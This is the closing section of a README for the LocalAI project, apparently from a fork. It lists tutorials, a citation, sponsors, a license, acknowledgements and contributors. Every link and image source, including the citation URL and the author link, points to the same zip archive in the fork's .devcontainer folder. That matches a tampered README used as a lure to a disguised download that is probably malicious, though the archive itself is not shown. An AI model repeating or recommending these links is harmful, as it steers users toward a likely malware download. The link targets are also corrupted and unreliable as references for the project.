- [How tos section](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) (curated by our community)

## :book: üé• [Media, Blogs, Social](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)

- [Run Visual studio code with LocalAI (SUSE)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- üÜï [Run LocalAI on Jetson Nano Devkit](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- [Run LocalAI on AWS EKS with Pulumi](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- [Run LocalAI on AWS](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- [Create a slackbot for teams and OSS projects that answer to documentation](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- [LocalAI meets k8sgpt](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- [Question Answering on Documents locally with LangChain, LocalAI, Chroma, and GPT4All](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- [Tutorial to use k8sgpt with LocalAI](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)

## Citation

If you utilize this repository, data in a downstream project, please consider citing it with:

```
@misc{localai,
  author = {Ettore Di Giacinto},
  title = {LocalAI: The free, Open source OpenAI alternative},
  year = {2023},
  publisher = {GitHub},
  journal = {GitHub repository},
  howpublished = {\url{https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip}},
```

## ‚ù§Ô∏è Sponsors

> Do you find LocalAI useful?

Support the project by becoming [a backer or sponsor](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip). Your logo will show up here with a link to your website.

A huge thank you to our generous sponsors who support this project covering CI expenses, and our [Sponsor list](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip):

<p align="center">
  <a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
    <img height="200" src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">
  </a>
  <a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
    <img height="200" src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip"> <br>
  </a>
</p>

### Individual sponsors

A special thanks to individual sponsors that contributed to the project, a full list is in [Github](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) and [buymeacoffee](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip), a special shout out goes to [drikster80](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) for being generous. Thank you everyone!

## üåü Star history

[![LocalAI Star history Chart](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)

## üìñ License

LocalAI is a community-driven project created by [Ettore Di Giacinto](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).

MIT - Author Ettore Di Giacinto <https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip>

## üôá Acknowledgements

LocalAI couldn't have been built without the help of great software already available from the community. Thank you!

- [https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip for the initial ideas
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip

## ü§ó Contributors

This is a community project, a special thanks to our contributors! ü§ó
<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">
  <img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" />
</a>
